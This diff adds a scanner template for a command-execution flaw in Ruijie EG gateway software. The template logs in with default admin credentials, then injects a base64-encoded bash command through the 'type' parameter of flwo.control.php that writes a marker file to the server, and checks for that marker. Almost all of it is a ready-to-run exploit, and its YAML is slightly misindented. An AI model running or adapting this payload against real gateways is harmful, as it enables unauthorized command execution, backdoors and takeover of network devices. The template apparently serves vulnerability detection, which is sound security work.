@@ -1,0 +1,49 @@
+id: Ruijie-EWEB-rce
+
+info:
+  name: Ruijie-EWEB-rce
+  author: apple
+  severity: critical
+  description: 锐捷EG易网关存在flwo.control.php命令执行漏洞，攻击者可利用该漏洞执行任意命令，写入后门，获取服务器权限，进而控制整个web服务器。 前提需要登录获取cookie
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%94%90%E6%8D%B7%E7%BD%91%E7%BB%9Cflwo.control.php%E5%AD%98%E5%9C%A8RCE%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+
+http:
+  - raw:
+      - |             
+        POST /ddi/server/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 
+
+        username=admin&password=admin?
+      - |              
+        POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: RUIJIEID={{cookie}};user=admin;
+        User-Agent: Mozilla/5.0 
+
+        type=%7Cbash+-c+%27echo+cm0gLXJmIC4uLzEyMzMyMXF3ZS50eHQgJiYgZWNobyBGMDhiYmZiMkJDOGNlZUQ2ID4gLi4vMTIzMzIxcXdlLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27
+
+      - |              
+        GET /123321qwe.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0      
+
+    extractors:
+      - type: regex
+      name: cookie
+      part: header
+      group: 1
+      internal: true
+      regex:
+        - "RUIJIEID=(.*); path=/"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+      dsl:
+        - 'status_code_3==200 && contains(body_3, "F08bbfb2BC8ceeD6") && contains(body_3, "text/plain")'
+
